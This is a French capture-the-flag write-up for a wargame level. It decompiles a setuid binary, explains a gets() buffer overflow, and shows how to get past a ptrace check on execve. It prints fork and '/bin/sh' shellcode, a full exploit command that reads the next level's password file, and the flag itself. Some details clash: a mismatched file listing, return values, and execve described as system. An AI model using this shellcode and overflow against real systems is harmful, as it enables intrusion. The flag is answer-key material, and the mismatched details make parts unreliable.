# override: [level04]

Observations:
---

#### Détails du profil:
```md
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```

#### Détails du programme:
```sh
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
```

#### Programme décompilé:
```c
//----- (080486C8) --------------------------------------------------------
int main(int argc, const char **argv, const char **envp)
{
	int stat_loc;
	char s[128];
	int v6;
	int v7;
	int v8;
	__pid_t v9;

	v9 = fork();
	memset(s, 0, sizeof(s));
	v8 = 0;
	stat_loc = 0;
	if ( v9 )
	{
		do
		{
			wait(&stat_loc);
			v6 = stat_loc;
			if ( (stat_loc & 0x7F) == 0 || (v7 = stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
			{
				puts("child is exiting...");
				return 0;
			}
			v8 = ptrace(PTRACE_PEEKUSER, v9, 44, 0);
		}
		while ( v8 != 0x0b );
		puts("no exec() for you");
		kill(v9, 9);
	}
	else
	{
		prctl(1, 1);
		ptrace(PTRACE_TRACEME, 0, 0, 0);
		puts("Give me some shellcode, k");
		gets(s);
	}
	return 0;
}
```

#### Fonctions:

| Nom | Description |
| --- | ----------- |
| `<main>`			| Cette fonction déclare un tableau `s` de **128** octets, et défini ses valeurs à **0**. <br> Ensuite elle fais appel à la fonction `<fork>` créant un processus secondaire. <br> L'identifiant du processus secondaire est gardé dans la variable `v9`. <br> Ensuite une condition vérifie si nous somme dans le processus parent ou enfant. <br><hr style="height: 0px; width: 590px;" /> Si nous sommes dans le processus parent alors la fonction entre dans une boucle qui d'abord attend <br> un changement quelconque du processus enfant et garde sa valeur de retour dans la variable `stat_loc`. <br> Si cette valeur de retour correspond à un arret du processus alors la fonction affiche un message et retourne **1**. <br> La boucle continue tant que la valeur à l'index **44** des données du processus enfant n'est pas égal à `0x0b`. <br> Si la boucle s'arrete alors la fonction affiche un message et tue le processus enfant avec la fonction `<kill>`. <br> <hr style="height: 0px; width: 590px;" /> Sinon si nous somme dans le processus enfant alors la fonction change les propriétés du processus enfant. <br> Tout d'abord pour que le processus parent puisse recevoir un signal en cas de fin de processus. <br> Puis pour que l'acces aux données du processus enfant soit ouvert au processus parent. <br> Pour finir la fonction retourne **0**. |


#### Conclusions:

Nous pouvons injecter du code grace à l'appel à la fonction `<gets>` dans le processus enfant. \
Ecrasant son adresse de retour, nous permettant ainsi de changer l'ordre d'exécution du programme. \
La condition de la boucle dans le processus parent vérifie si le registre `eax` du processus enfant est définie à `0x0b`. \
Il peut donc savoir si le processus s'apprête à exécuter la fonction `<system>`. \
Tuant sur le champs le processus enfant, nous empéchant donc d'exécuter notre code. \
Heureusement nous pouvons contourner cela en exécutant notre code dans un autre processus.

----
Résolution:
----
Grace à l'appel à la fonction `<gets>`, nous pouvons effectuer un débordement de mémoire, \
nous permettant d'injecter une fonction exécutant `<system>`. \
Mais au début de cette fonction nous allons d'abord ajouter un appel à la fonction `<fork>`, \
créant ainsi un nouveau processus sur lequel le processus parent ne pourras interférer. \
Nous allons ensuite pouvoir écraser l'addresse de retour de la fonction `<main>`. \
Ce faisant le processus enfant pourras exécuter le code injecté.

La commande débuteras avec le code de la fonction d'appel à `<fork>`, suivit du code la fonction d'appel à `<system>`. \
Ensuite nous ajoutons **125** caractères de bourrage nous permettant d'atteindre l'addresse de retour de la fonction `<main>`. \
Puis l'addresse du tableau `s` pour que le programme l'exécute en retournant.

> Le début de notre commande nous permet d'enlever l'environnement \
> Nous permettant ainsi de calculer les addresses mémoire plus facilement. \
> Car l'environnement décal la pile mémoire.

#### Injection:
```asm
# Cette fonction appelle <fork>:

0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  b0 02                   mov    al,0x2
5:  cd 80                   int    0x80
```
```asm
# Cette fonction appelle <system> avec '/bin/sh' en paramètre:

0:  6a 0b                   push   0xb
2:  58                      pop    eax
3:  31 f6                   xor    esi,esi
5:  56                      push   esi
6:  68 2f 2f 73 68          push   0x68732f2f
b:  68 2f 62 69 6e          push   0x6e69622f
10: 89 e3                   mov    ebx,esp
12: 31 c9                   xor    ecx,ecx
14: 89 ca                   mov    edx,ecx
16: cd 80                   int    0x80
```

#### Commande:

```bash
echo $(echo $(unset $(env | cut -d= -f1); (/usr/bin/python -c "print('\x31\xc0\x50\xb0\x02\xcd\x80\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80' + 'a'*125 + '\xff\xff\xdd\xa0'[::-1])" ; /bin/echo '/bin/cat /home/users/level05/.pass') | /home/users/level04/level04))
```

#### Flag: `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN`